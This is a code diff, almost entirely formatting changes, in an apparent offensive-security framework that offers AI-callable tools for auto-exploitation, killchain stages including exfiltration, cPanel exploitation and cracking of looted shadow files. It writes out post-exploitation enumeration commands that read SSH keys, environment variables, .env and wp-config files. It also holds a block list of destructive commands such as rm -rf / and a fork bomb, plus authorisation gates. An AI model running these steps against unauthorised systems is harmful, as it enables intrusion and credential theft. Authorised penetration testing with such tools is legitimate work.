@@ -72,14 +72,46 @@ _CONTROLLED_SSH_INVENTORY_CHECKS = [
     ("Listening services", "ss -tulpen 2>/dev/null || netstat -tulpen 2>/dev/null", 10),
     ("Sudo rights", "sudo -n -l 2>/dev/null || true", 8),
     ("Process snapshot", "ps -eo user,pid,ppid,comm,args --sort=comm 2>/dev/null | head -100", 10),
-    ("Running services", "systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null | head -100", 10),
-    ("Runtime stack markers", "command -v nginx apache2 httpd php php-fpm python3 node npm go java docker podman psql mysql redis-server mongod 2>/dev/null || true", 8),
-    ("Software versions", "(nginx -v 2>&1 || true); (apache2 -v 2>&1 || httpd -v 2>&1 || true); (php -v 2>/dev/null | head -1 || true); (python3 --version 2>&1 || true); (node --version 2>&1 || true); (docker --version 2>&1 || true); (podman --version 2>&1 || true); (psql --version 2>&1 || true); (mysql --version 2>&1 || true); (redis-server --version 2>&1 || true); (mongod --version 2>&1 || true)", 12),
-    ("Container runtime", "docker ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -60; podman ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -60", 10),
-    ("Web roots", "find /var/www /srv /opt /home -maxdepth 3 -type d \\( -name public -o -name html -o -name www -o -name app -o -name current \\) 2>/dev/null | head -100", 12),
-    ("App manifests", "find /var/www /srv /opt /home -maxdepth 5 -type f \\( -name package.json -o -name composer.json -o -name requirements.txt -o -name pyproject.toml -o -name go.mod -o -name Gemfile -o -name pom.xml \\) 2>/dev/null | head -140", 14),
-    ("Config candidates", "find /var/www /srv /opt /home -maxdepth 5 -type f \\( -name .env -o -name wp-config.php -o -name config.php -o -name settings.py -o -name database.yml -o -name application.yml \\) -printf '%p %s bytes\\n' 2>/dev/null | head -140", 14),
-    ("Scheduled tasks", "find /etc/cron* /var/spool/cron -maxdepth 2 -type f 2>/dev/null | head -80; systemctl list-timers --all --no-pager --no-legend 2>/dev/null | head -80", 10),
+    (
+        "Running services",
+        "systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null | head -100",
+        10,
+    ),
+    (
+        "Runtime stack markers",
+        "command -v nginx apache2 httpd php php-fpm python3 node npm go java docker podman psql mysql redis-server mongod 2>/dev/null || true",
+        8,
+    ),
+    (
+        "Software versions",
+        "(nginx -v 2>&1 || true); (apache2 -v 2>&1 || httpd -v 2>&1 || true); (php -v 2>/dev/null | head -1 || true); (python3 --version 2>&1 || true); (node --version 2>&1 || true); (docker --version 2>&1 || true); (podman --version 2>&1 || true); (psql --version 2>&1 || true); (mysql --version 2>&1 || true); (redis-server --version 2>&1 || true); (mongod --version 2>&1 || true)",
+        12,
+    ),
+    (
+        "Container runtime",
+        "docker ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -60; podman ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -60",
+        10,
+    ),
+    (
+        "Web roots",
+        "find /var/www /srv /opt /home -maxdepth 3 -type d \\( -name public -o -name html -o -name www -o -name app -o -name current \\) 2>/dev/null | head -100",
+        12,
+    ),
+    (
+        "App manifests",
+        "find /var/www /srv /opt /home -maxdepth 5 -type f \\( -name package.json -o -name composer.json -o -name requirements.txt -o -name pyproject.toml -o -name go.mod -o -name Gemfile -o -name pom.xml \\) 2>/dev/null | head -140",
+        14,
+    ),
+    (
+        "Config candidates",
+        "find /var/www /srv /opt /home -maxdepth 5 -type f \\( -name .env -o -name wp-config.php -o -name config.php -o -name settings.py -o -name database.yml -o -name application.yml \\) -printf '%p %s bytes\\n' 2>/dev/null | head -140",
+        14,
+    ),
+    (
+        "Scheduled tasks",
+        "find /etc/cron* /var/spool/cron -maxdepth 2 -type f 2>/dev/null | head -80; systemctl list-timers --all --no-pager --no-legend 2>/dev/null | head -80",
+        10,
+    ),
 ]
 
 
@@ -127,10 +159,18 @@ def _ssh_analyze(host: str, user: str, pwd: str, port: int = 22) -> str:
             ("Kernel", "uname -r", 8),
             ("Network addresses", "ip -o addr show 2>/dev/null | head -80 || ifconfig -a 2>/dev/null | head -120", 10),
             ("Listening services", "ss -tulpen 2>/dev/null | head -120 || netstat -tulpen 2>/dev/null | head -120", 10),
-            ("Interactive users", "awk -F: '$7 !~ /(nologin|false)$/ {print $1\":\"$3\":\"$6\":\"$7}' /etc/passwd 2>/dev/null | head -80", 8),
+            (
+                "Interactive users",
+                'awk -F: \'$7 !~ /(nologin|false)$/ {print $1":"$3":"$6":"$7}\' /etc/passwd 2>/dev/null | head -80',
+                8,
+            ),
             ("Sudo rights", "sudo -n -l 2>/dev/null || true", 8),
             ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -80", 15),
-            ("Writable temp dirs", "find /tmp /var/tmp /dev/shm -maxdepth 1 -writable -type d 2>/dev/null | head -80", 8),
+            (
+                "Writable temp dirs",
+                "find /tmp /var/tmp /dev/shm -maxdepth 1 -writable -type d 2>/dev/null | head -80",
+                8,
+            ),
             ("Home directories", "ls -la /home 2>/dev/null; ls -la /root 2>/dev/null | head -40", 8),
             ("SSH material", "find ~/.ssh /home -maxdepth 3 -type f 2>/dev/null | head -80", 10),
             ("Environment", "env 2>/dev/null | sort | head -80", 8),
@@ -161,11 +201,11 @@ def _ssh_exec_block_reason(command: str) -> str:
         return "empty command"
     lowered = cmd.lower()
     blocked_patterns = [
-        (r'(^|[;&|]\s*)rm\s+-[^\n]*r[^\n]*\s+/(?:\s|$)', "recursive delete from filesystem root"),
-        (r'(^|[;&|]\s*)(mkfs|shutdown|reboot|poweroff)\b', "destructive system command"),
-        (r'(^|[;&|]\s*)init\s+[06]\b', "destructive runlevel change"),
-        (r'\bdd\s+.*\bof=/dev/', "raw block-device write"),
-        (r':\s*\(\s*\)\s*\{', "fork-bomb pattern"),
+        (r"(^|[;&|]\s*)rm\s+-[^\n]*r[^\n]*\s+/(?:\s|$)", "recursive delete from filesystem root"),
+        (r"(^|[;&|]\s*)(mkfs|shutdown|reboot|poweroff)\b", "destructive system command"),
+        (r"(^|[;&|]\s*)init\s+[06]\b", "destructive runlevel change"),
+        (r"\bdd\s+.*\bof=/dev/", "raw block-device write"),
+        (r":\s*\(\s*\)\s*\{", "fork-bomb pattern"),
     ]
     for pattern, reason in blocked_patterns:
         if re.search(pattern, lowered):
@@ -191,9 +231,9 @@ def _arbitrary_ssh_exec_allowed() -> bool:
 
 
 def _normalize_controlled_ssh_command(command: str) -> str:
-    cmd = re.sub(r'\s+', ' ', (command or "").strip())
-    cmd = re.sub(r'\s+2>/dev/null', '', cmd)
-    cmd = re.sub(r'\s+\|\|\s+true$', '', cmd)
+    cmd = re.sub(r"\s+", " ", (command or "").strip())
+    cmd = re.sub(r"\s+2>/dev/null", "", cmd)
+    cmd = re.sub(r"\s+\|\|\s+true$", "", cmd)
     return cmd.strip()
 
 
@@ -207,7 +247,6 @@ def _is_controlled_ssh_command(command: str) -> bool:
     }
 
 
-
 def _run_ssh_session_interactive(target: str) -> str:
     """Interactive SSH session — prompts for creds if not already known."""
     # Check if we already have creds for this target
@@ -215,7 +254,7 @@ def _run_ssh_session_interactive(target: str) -> str:
     if known is not None:
         print(f"  \033[92m[+] Using cached credential: {known.username}@{target}\033[0m")
         use_cached = input(f"  Use cached credential {known.username}@{target}? [Y/n]: ").strip().lower()
-        if use_cached != 'n':
+        if use_cached != "n":
             return call_credential_provider(
                 known,
                 lambda material: _ssh_analyze(
@@ -225,7 +264,7 @@ def _run_ssh_session_interactive(target: str) -> str:
                 ),
             )
     user = input(f"  SSH Username for {target}: ").strip() or "root"
-    pwd  = input(f"  SSH Password for {target}: ").strip()
+    pwd = input(f"  SSH Password for {target}: ").strip()
     if not pwd:
         return "[!] No password provided."
     # Register creds for reuse
@@ -257,6 +296,7 @@ def _run_killchain_stage(stage: str, target: str) -> str:
         return denial
     try:
         from core.killchain import auto_exploit, vuln_assess
+
         if stage == "vuln_assess":
             return vuln_assess(target)
         elif stage == "auto_exploit":
@@ -277,11 +317,7 @@ def _run_killchain_interactive(stage: str, target: str) -> str:
         "exfil": "data_exfil",
         "cleanup": "cleanup",
     }
-    denial = (
-        master_gate_message()
-        if stage == "full"
-        else stage_gate_message(stage_names.get(stage, stage))
-    )
+    denial = master_gate_message() if stage == "full" else stage_gate_message(stage_names.get(stage, stage))
     if denial:
         return denial
     try:
@@ -302,11 +338,11 @@ def _run_killchain_interactive(stage: str, target: str) -> str:
     if known is not None:
         print(f"  \033[92m[+] Using cached credential: {known.username}@{target}\033[0m")
         use_cached = input(f"  Use cached credential {known.username}@{target}? [Y/n]: ").strip().lower()
-        if use_cached != 'n':
+        if use_cached != "n":
             credential = known
         else:
             user = input(f"  SSH Username for {target}: ").strip() or "root"
-            pwd  = input(f"  SSH Password for {target}: ").strip()
+            pwd = input(f"  SSH Password for {target}: ").strip()
             if not pwd:
                 return "[!] No password provided."
             register_credential("ssh", target, user, pwd, port=22)
@@ -318,7 +354,7 @@ def _run_killchain_interactive(stage: str, target: str) -> str:
             )
     else:
         user = input(f"  SSH Username for {target}: ").strip() or "root"
-        pwd  = input(f"  SSH Password for {target}: ").strip()
+        pwd = input(f"  SSH Password for {target}: ").strip()
         if not pwd:
             return "[!] No password provided."
         # Register creds for reuse by AI and other stages
@@ -359,12 +395,13 @@ def _run_waf_detect(target: str) -> str:
     """Detect WAF/firewall on target."""
     try:
         from evasion import WebEvasionSession
+
         ws = WebEvasionSession()
         result = ws.detect_waf(f"http://{target}")
         out = f"[WAF DETECTION — {target}]\n"
         out += f"WAF Detected: {result['waf_detected']}\n"
         out += f"WAF Type: {result['waf_type']}\n"
-        for d in result.get('details', []):
+        for d in result.get("details", []):
             out += f"  → {d}\n"
         return out
     except ImportError:
@@ -373,29 +410,36 @@ def _run_waf_detect(target: str) -> str:
 
 # SHODAN MENU HELPERS
 
+
 def _run_shodan_interactive(target: str) -> str:
     """Interactive Shodan search from menu."""
     try:
         from shodan_module import run_shodan_interactive
+
         return run_shodan_interactive(target)
     except ImportError:
         return "[!] shodan_module.py not found. pip install shodan"
+
 
 def _run_shodan_host(target: str) -> str:
     """Shodan host lookup from menu."""
     try:
         from shodan_module import run_shodan_host
+
         return run_shodan_host(target)
     except ImportError:
         return "[!] shodan_module.py not found."
+
 
 def _run_shodan_vulns(target: str) -> str:
     """Shodan CVE lookup from menu."""
     try:
         from shodan_module import run_shodan_vulns
+
         return run_shodan_vulns(target)
     except ImportError:
         return "[!] shodan_module.py not found."
+
 
 def _run_shodan_range(target: str) -> str:
     """Shodan range/subnet scan from menu."""
@@ -404,9 +448,10 @@ def _run_shodan_range(target: str) -> str:
         import re as _re
 
         from shodan_module import run_shodan_range
-        if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target.strip()):
+
+        if _re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target.strip()):
             # Single IP — suggest /24
-            subnet = '.'.join(target.split('.')[:3]) + '.0/24'
+            subnet = ".".join(target.split(".")[:3]) + ".0/24"
             cidr = input(f"  CIDR range [{subnet}]: ").strip() or subnet
         else:
             cidr = input("  CIDR range (e.g. 83.166.241.0/24): ").strip()
@@ -416,10 +461,12 @@ def _run_shodan_range(target: str) -> str:
     except ImportError:
         return "[!] shodan_module.py not found."
 
+
 def _run_crack_hashes(target: str) -> str:
     """Hash cracking from menu — auto-detects shadow files from loot."""
     try:
         from hash_cracker import run_crack_hashes
+
         if os.path.isfile(target):
             return run_crack_hashes(target)
         # Detect shadow files among collected artifacts.
@@ -450,6 +497,7 @@ def _run_crack_hashes(target: str) -> str:
 
 # MAIN RECON PIPELINE
 
+
 def run_default_recon(target: str) -> dict:
     """
     Run the standard recon pipeline CONCURRENTLY.
@@ -461,21 +509,19 @@ def run_default_recon(target: str) -> dict:
 
     # We select the fast/standard tools for the default run
     default_tools = {
-        "nmap":         run_nmap,
-        "whois":        run_whois,
-        "whatweb":      run_whatweb,
+        "nmap": run_nmap,
+        "whois": run_whois,
+        "whatweb": run_whatweb,
         "curl_headers": run_curl_headers,
-        "dig":          run_dig,
-        "sslscan":      run_sslscan,
-        "ffuf":         run_ffuf,
-        "enum4linux":   run_enum4linux,
-        "smbclient":    run_smbclient,
+        "dig": run_dig,
+        "sslscan": run_sslscan,
+        "ffuf": run_ffuf,
+        "enum4linux": run_enum4linux,
+        "smbclient": run_smbclient,
     }
 
     results = {}
-    with concurrent.futures.ThreadPoolExecutor(
-        max_workers=effective_parallel_workers(len(default_tools))
-    ) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=effective_parallel_workers(len(default_tools))) as executor:
         future_to_name = {executor.submit(func, target): key for key, func in default_tools.items()}
         for future in concurrent.futures.as_completed(future_to_name):
             tool_name = future_to_name[future]
@@ -490,7 +536,8 @@ def run_default_recon(target: str) -> dict:
         import re as _re
 
         from shodan_module import run_shodan_host
-        if _re.match(r'^\d+\.\d+\.\d+\.\d+$', target.strip()):
+
+        if _re.match(r"^\d+\.\d+\.\d+\.\d+$", target.strip()):
             shodan_data = run_shodan_host(target)
             if shodan_data and "[!]" not in shodan_data[:10]:
                 results["shodan"] = shodan_data
@@ -546,8 +593,7 @@ def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) 
     import time
 
     screenshot_dir = os.path.join(
-        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
-        "data", "screenshots"
+        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "data", "screenshots"
     )
     os.makedirs(screenshot_dir, exist_ok=True)
     ts = int(time.time())
@@ -564,7 +610,10 @@ def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) 
     print(f"  [*] Step 1: Verifying API access via {api_url[:60]}...")
     try:
         api_result = sb.browse_with_cookies(
-            api_url, cookies, headless=True, wait=3,
+            api_url,
+            cookies,
+            headless=True,
+            wait=3,
         )
         api_content = api_result.get("content", "")
         api_result.get("title", "")
@@ -586,8 +635,11 @@ def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) 
     print("  [*] Step 2: Opening WHM dashboard...")
     try:
         dash_result = sb.browse_with_cookies(
-            dashboard_url, cookies, headless=True,
-            screenshot_path=screenshot_path, wait=5,
+            dashboard_url,
+            cookies,
+            headless=True,
+            screenshot_path=screenshot_path,
+            wait=5,
         )
         content = dash_result.get("content", "")
         title = dash_result.get("title", "")
@@ -642,15 +694,15 @@ def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) 
         lines.append("  ✅ BROWSER VERIFICATION COMPLETE")
 
         # Extract text summary for AI
-        text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
-        text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
-        text = re.sub(r'<[^>]+>', ' ', text)
-        text = re.sub(r'\s+', ' ', text).strip()
+        text = re.sub(r"<script[^>]*>.*?</script>", "", content, flags=re.DOTALL)
+        text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL)
+        text = re.sub(r"<[^>]+>", " ", text)
+        text = re.sub(r"\s+", " ", text).strip()
         if len(text) > 200:
             lines.append("")
             lines.append("  ─── PAGE TEXT (first 2000 chars) ───")
             for i in range(0, min(len(text), 2000), 120):
-                lines.append(f"  {text[i:i+120]}")
+                lines.append(f"  {text[i : i + 120]}")
 
     except Exception as e:
         lines.append(f"  [!] Dashboard browse failed: {e}")
@@ -744,9 +796,7 @@ def _run_cpanel_exploit(target: str) -> str:
 
             verify = input("\n  [?] Open cPanel dashboard in ShardBrowser to verify? [Y/n]: ").strip().lower()
             if verify != "n":
-                browser_result = _verify_cpanel_in_browser(
-                    target, port, result["token"], result["session"]
-                )
+                browser_result = _verify_cpanel_in_browser(target, port, result["token"], result["session"])
                 lines.append(browser_result)
             else:
                 lines.append("")
@@ -771,16 +821,19 @@ def _run_shardbrowser_osint(target: str) -> str:
     sb = ShardBrowser()
     status = sb.get_status()
     if not status.get("installed"):
-        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-                "Install deps: pip install httpx[socks] patchright")
+        return (
+            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
+            "Install deps: pip install httpx[socks] patchright"
+        )
 
     import re as _re
 
     # Detect if target is IP/URL (navigate directly) vs search query (OSINT search)
-    is_ip_or_url = bool(_re.match(
-        r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$|^https?://|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/.*)?$',
-        target.strip()
-    ))
+    is_ip_or_url = bool(
+        _re.match(
+            r"^(\d{1,3}\.){3}\d{1,3}(:\d+)?$|^https?://|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/.*)?$", target.strip()
+        )
+    )
 
     if is_ip_or_url:
         # Default: direct navigation mode
@@ -803,10 +856,13 @@ def _run_shardbrowser_osint(target: str) -> str:
         session = None
         try:
             session = sb.launch_profile(
-                platform="Windows", headless=True, randomize=True,
+                platform="Windows",
+                headless=True,
+                randomize=True,
             )
 
             import asyncio
+
             try:
                 loop = asyncio.get_running_loop()
             except RuntimeError:
@@ -815,15 +871,13 @@ def _run_shardbrowser_osint(target: str) -> str:
             if loop and loop.is_running():
                 # Already in async context — use new loop in thread
                 import concurrent.futures
+
                 with concurrent.futures.ThreadPoolExecutor() as pool:
-                    content = pool.submit(
-                        asyncio.run,
-                        sb._browse_async(session.cdp_url, url, wait=5)
-                    ).result(timeout=30)
+                    content = pool.submit(asyncio.run, sb._browse_async(session.cdp_url, url, wait=5)).result(
+                        timeout=30
+                    )
             else:
-                content = asyncio.run(
-                    sb._browse_async(session.cdp_url, url, wait=5)
-                )
+                content = asyncio.run(sb._browse_async(session.cdp_url, url, wait=5))
 
             # Extract useful info from page
             lines = []
@@ -836,13 +890,15 @@ def _run_shardbrowser_osint(target: str) -> str:
 
             # Extract title
             import re
-            title_m = re.search(r'<title[^>]*>(.*?)</title>', content, re.DOTALL | re.IGNORECASE)
+
+            title_m = re.search(r"<title[^>]*>(.*?)</title>", content, re.DOTALL | re.IGNORECASE)
             if title_m:
                 lines.append(f"  Page title:     {title_m.group(1).strip()[:100]}")
 
             # Extract headers from meta tags
-            metas = re.findall(r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']',
-                               content, re.IGNORECASE)
+            metas = re.findall(
+                r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']', content, re.IGNORECASE
+            )
             if metas:
                 lines.append("  Meta tags:")
                 for name, val in metas[:10]:
@@ -864,16 +920,19 @@ def _run_shardbrowser_osint(target: str) -> str:
                     lines.append(f"    POST → {f}")
 
             # Extract input fields (credential fields)
-            inputs = re.findall(r'<input[^>]*type=["\']?(password|text|email)["\']?[^>]*name=["\']([^"\']+)["\']',
-                                content, re.IGNORECASE)
+            inputs = re.findall(
+                r'<input[^>]*type=["\']?(password|text|email)["\']?[^>]*name=["\']([^"\']+)["\']',
+                content,
+                re.IGNORECASE,
+            )
             if inputs:
                 lines.append("  Input fields:")
                 for itype, iname in inputs[:10]:
                     lines.append(f"    [{itype}] {iname}")
 
             # Server headers from content clues
-            server_m = re.search(r'[Ss]erver:\s*([^\r\n]+)', content)
-            poweredby = re.search(r'[Xx]-[Pp]owered-[Bb]y:\s*([^\r\n]+)', content)
+            server_m = re.search(r"[Ss]erver:\s*([^\r\n]+)", content)
+            poweredby = re.search(r"[Xx]-[Pp]owered-[Bb]y:\s*([^\r\n]+)", content)
             if server_m:
                 lines.append(f"  Server:         {server_m.group(1)}")
             if poweredby:
@@ -882,12 +941,12 @@ def _run_shardbrowser_osint(target: str) -> str:
             lines.append("")
             lines.append("  ─── PAGE CONTENT (first 3000 chars) ───")
             # Strip HTML tags for readable text
-            text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
-            text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
-            text = re.sub(r'<[^>]+>', ' ', text)
-            text = re.sub(r'\s+', ' ', text).strip()
+            text = re.sub(r"<script[^>]*>.*?</script>", "", content, flags=re.DOTALL)
+            text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL)
+            text = re.sub(r"<[^>]+>", " ", text)
+            text = re.sub(r"\s+", " ", text).strip()
             for i in range(0, min(len(text), 3000), 120):
-                lines.append(f"  {text[i:i+120]}")
+                lines.append(f"  {text[i : i + 120]}")
 
             return "\n".join(lines)
 
@@ -906,11 +965,12 @@ def _run_shardbrowser_osint(target: str) -> str:
         engines = [e.strip() for e in engines_str.split(",")] if engines_str else None
         results = sb.osint_target(query, engines=engines)
         import json as _json
+
         return f"[ShardX OSINT Search — {query}]\n" + _json.dumps(results, indent=2, default=str)
 
 
-
 # ── AI FACING WRAPPERS FOR REGISTRY ─────────────────────
+
 
 def _resolve_credential_ref(
     host: str,
@@ -924,10 +984,7 @@ def _resolve_credential_ref(
     """Resolve a control-plane handle without exposing credential material."""
 
     if credential_handle:
-        if not (
-            isinstance(credential_handle, CredentialRef)
-            or is_credential_handle(credential_handle)
-        ):
+        if not (isinstance(credential_handle, CredentialRef) or is_credential_handle(credential_handle)):
             return None, (
                 "[!] Plaintext credential arguments are prohibited. Register the "
                 "credential first and pass its credential:// handle."
@@ -1046,15 +1103,18 @@ def _ad_creds_for_execution(
         # AD enumeration and AS-REP discovery retain their anonymous/domain-only
         # mode when the caller did not request a credential.
         if domain:
-            yield {
-                "user": "",
-                "username": "",
-                "password": "",
-                "domain": domain,
-                "nthash": "",
-                "service": "",
-                "port": 0,
-            }, ""
+            yield (
+                {
+                    "user": "",
+                    "username": "",
+                    "password": "",
+                    "domain": domain,
+                    "nthash": "",
+                    "service": "",
+                    "port": 0,
+                },
+                "",
+            )
         else:
             yield None, ""
         return
@@ -1091,8 +1151,9 @@ def _call_ad_provider(creds: dict | None, provider) -> str:
     return sanitize_credential_text(result, plaintext)
 
 
-def _connect_ssh_for_tool(host: str, user: str | None = None, pwd: str | None = None,
-                          port: int = 22, prefer_privileged: bool = False):
+def _connect_ssh_for_tool(
+    host: str, user: str | None = None, pwd: str | None = None, port: int = 22, prefer_privileged: bool = False
+):
     explicit_handle = bool(pwd)
     candidates: list[CredentialRef] = []
     if explicit_handle:
@@ -1145,10 +1206,7 @@ def _connect_ssh_for_tool(host: str, user: str | None = None, pwd: str | None = 
                 )
             except Exception as exc:
                 client = None
-                err = (
-                    f"{type(exc).__name__}: "
-                    f"{sanitize_credential_text(exc, material.password)}"
-                )
+                err = f"{type(exc).__name__}: {sanitize_credential_text(exc, material.password)}"
             else:
                 err = sanitize_credential_text(err or "", material.password)
         if not err and client is not None:
@@ -1156,18 +1214,21 @@ def _connect_ssh_for_tool(host: str, user: str | None = None, pwd: str | None = 
         last_err = err or "unknown error"
         if explicit_handle:
             break
-    return None, candidates[0].username, candidates[0].handle, f"[!] SSH connection failed: {last_err or 'unknown error'}"
-
-
-def _run_controlled_ssh_inventory(host: str, user: str | None = None, pwd: str | None = None,
-                                  port: int = 22) -> str:
-    client, user, _pwd, err = _connect_ssh_for_tool(
-        host, user, pwd, port=port, prefer_privileged=True
+    return (
+        None,
+        candidates[0].username,
+        candidates[0].handle,
+        f"[!] SSH connection failed: {last_err or 'unknown error'}",
     )
+
+
+def _run_controlled_ssh_inventory(host: str, user: str | None = None, pwd: str | None = None, port: int = 22) -> str:
+    client, user, _pwd, err = _connect_ssh_for_tool(host, user, pwd, port=port, prefer_privileged=True)
     if err:
         return err
     try:
         from core.killchain.ssh_helpers import _ssh_exec
+
         lines = [
             f"[*] SSH Controlled Inventory: {user}@{host}:{port}",
             f"[+] SSH connected as {user}@{host}:{port}",
@@ -1239,7 +1300,7 @@ def _register_cracked_pairs_from_output(output: str, target: str) -> int:
     if not target or os.path.isfile(target):
         return 0
     registered = 0
-    for m in re.finditer(r'^\s*\+\s*([^:\s]+):(.+?)\s*$', output or "", re.MULTILINE):
+    for m in re.finditer(r"^\s*\+\s*([^:\s]+):(.+?)\s*$", output or "", re.MULTILINE):
         user, pwd = m.groups()
         pwd = pwd.strip()
         if not user or not pwd:
@@ -1269,9 +1330,9 @@ def _summarize_browser_content(url: str, content: str) -> str:
         f"Content size: {len(content or '')} bytes",
     ]
 
-    title_m = re.search(r'<title[^>]*>(.*?)</title>', content or "", re.DOTALL | re.IGNORECASE)
+    title_m = re.search(r"<title[^>]*>(.*?)</title>", content or "", re.DOTALL | re.IGNORECASE)
     if title_m:
-        title = re.sub(r'\s+', ' ', title_m.group(1)).strip()
+        title = re.sub(r"\s+", " ", title_m.group(1)).strip()
         lines.append(f"Page title: {title[:160]}")
 
     metas = re.findall(
@@ -1282,7 +1343,7 @@ def _summarize_browser_content(url: str, content: str) -> str:
     if metas:
         lines.append("Meta tags:")
         for name, val in metas[:12]:
-            clean_val = re.sub(r'\s+', ' ', val).strip()
+            clean_val = re.sub(r"\s+", " ", val).strip()
             lines.append(f"  {name}: {clean_val[:140]}")
 
     hrefs = re.findall(r'href=["\']([^"\']+)["\']', content or "", re.IGNORECASE)
@@ -1308,10 +1369,10 @@ def _summarize_browser_content(url: str, content: str) -> str:
         for itype, iname in inputs[:20]:
             lines.append(f"  input: {itype}:{iname}")
 
-    text = re.sub(r'<script[^>]*>.*?</script>', '', content or "", flags=re.DOTALL | re.IGNORECASE)
-    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
-    text = re.sub(r'<[^>]+>', ' ', text)
-    text = re.sub(r'\s+', ' ', text).strip()
+    text = re.sub(r"<script[^>]*>.*?</script>", "", content or "", flags=re.DOTALL | re.IGNORECASE)
+    text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL | re.IGNORECASE)
+    text = re.sub(r"<[^>]+>", " ", text)
+    text = re.sub(r"\s+", " ", text).strip()
     if text:
         lines.append("Visible text:")
         lines.append(text[:2000])
@@ -1319,8 +1380,9 @@ def _summarize_browser_content(url: str, content: str) -> str:
     return "\n".join(lines)
 
 
-def _run_shardbrowser_direct(target: str, proto: str = "https", port: str = "",
-                             wait: float = 5, headless: bool = True) -> str:
+def _run_shardbrowser_direct(
+    target: str, proto: str = "https", port: str = "", wait: float = 5, headless: bool = True
+) -> str:
     try:
         from core.osint.shardbrowser import ShardBrowser
     except ImportError:
@@ -1329,8 +1391,10 @@ def _run_shardbrowser_direct(target: str, proto: str = "https", port: str = "",
     sb = ShardBrowser()
     status = sb.get_status()
     if not status.get("installed"):
-        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-                "Install deps: pip install httpx[socks] patchright")
+        return (
+            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
+            "Install deps: pip install httpx[socks] patchright"
+        )
 
     url = _build_browser_url(target, proto=proto, port=port)
     session = None
@@ -1379,8 +1443,12 @@ def _active_msf_allowed_for_target(target: str) -> bool:
     )
 
 
-
-@tool(name="killchain_vuln_assess", aliases=["killchain_vuln", "vuln_assess"], category="post", description="Killchain Vulnerability Assessment")
+@tool(
+    name="killchain_vuln_assess",
+    aliases=["killchain_vuln", "vuln_assess"],
+    category="post",
+    description="Killchain Vulnerability Assessment",
+)
 def ai_vuln_assess(target_ip: str, recon_data: str = "") -> str:
     from core.killchain.policy import stage_gate_message
 
@@ -1388,7 +1456,9 @@ def ai_vuln_assess(target_ip: str, recon_data: str = "") -> str:
     if denial:
         return denial
     from core.killchain import vuln_assess
+
     return vuln_assess(target_ip, recon_data)
+
 
 @tool(name="killchain_exploit", aliases=["auto_exploit"], category="post", description="Killchain Auto Exploit")
 def ai_auto_exploit(target_ip: str, recon_data: str = "") -> str:
@@ -1398,14 +1468,29 @@ def ai_auto_exploit(target_ip: str, recon_data: str = "") -> str:
     if denial:
         return denial
     from core.killchain import auto_exploit
+
     return auto_exploit(target_ip, recon_data)
 
-@tool(name="exploit_select", aliases=["select_exploits", "payload_plan", "exploit_plan"], category="exploit", description="Select exploit/MSF candidates and payload recommendations from service versions.")
+
+@tool(
+    name="exploit_select",
+    aliases=["select_exploits", "payload_plan", "exploit_plan"],
+    category="exploit",
+    description="Select exploit/MSF candidates and payload recommendations from service versions.",
+)
 def ai_exploit_select(target_ip: str, recon_data: str = "") -> str:
     from core.exploits.selector import select_exploits
+
     return select_exploits(target_ip, recon_data)
 
-@tool(name="msf_check", aliases=["metasploit_check", "msf"], category="exploit", description="Run Metasploit check/auxiliary verification for a selected module.", requires=["msfconsole"])
+
+@tool(
+    name="msf_check",
+    aliases=["metasploit_check", "msf"],
+    category="exploit",
+    description="Run Metasploit check/auxiliary verification for a selected module.",
+    requires=["msfconsole"],
+)
 def ai_msf_check(target_ip: str, module: str = "", options: str = "") -> str:
     if not module:
         return "[!] msf_check requires target and module. Example: msf_check 10.0.0.5 exploit/unix/ftp/vsftpd_234_backdoor RPORT=21"
@@ -1417,6 +1502,7 @@ def ai_msf_check(target_ip: str, module: str = "", options: str = "") -> str:
     if error:
         return error
     from msf import run_msf_module
+
     if "RHOSTS=" not in opts.upper():
         opts = f"RHOSTS={target_ip} {opts}".strip()
     if credential is not None:
@@ -1465,9 +1551,13 @@ def _prepare_msf_login_check(
         return options or "", None, ""
     opts = options or ""
     if _MSF_CREDENTIAL_OPTION.search(opts):
-        return "", None, (
-            "[!] MSF credential options are prohibited at the command boundary; "
-            "register the credential and use its typed provider reference."
+        return (
+            "",
+            None,
+            (
+                "[!] MSF credential options are prohibited at the command boundary; "
+                "register the credential and use its typed provider reference."
+            ),
         )
 
     service = _msf_login_service(module)
@@ -1476,9 +1566,13 @@ def _prepare_msf_login_check(
         credential = get_best_credential_ref(target_ip, "ssh")
